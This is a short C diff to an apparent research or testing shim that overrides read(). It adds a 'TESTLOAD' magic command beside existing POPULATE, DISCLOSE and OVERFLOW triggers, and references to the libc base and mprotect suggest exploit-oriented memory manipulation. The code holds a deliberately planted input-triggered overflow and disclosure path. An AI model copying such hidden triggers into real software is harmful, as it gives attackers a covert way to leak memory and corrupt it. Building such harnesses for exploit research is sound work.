@@ -37,6 +37,7 @@ static const char *s_magic = "xyzzy";
 static const char *s_populate = "POPULATE";
 static const char *s_disclose = "DISCLOSE";
 static const char *s_overflow = "OVERFLOW";
+static const char *s_testload = "TESTLOAD";
 
 static const char *s_libc_base     = "base";
 static const char *s_libc_mprotect = "mprotect";
@@ -186,6 +187,8 @@ ssize_t read(int fd, void *buf, size_t count) {
 			populate(&payload);
 		else if (!strncmp(s_disclose, p, strlen(s_disclose)))
 			disclose(&payload);
+		else if (!strncmp(s_testload, p, strlen(s_testload)))
+			testload(&payload);
 		else if (!strncmp(s_overflow, p, strlen(s_overflow)))
 			overflow(p, result - (p - (char *) buf));
 	} // if
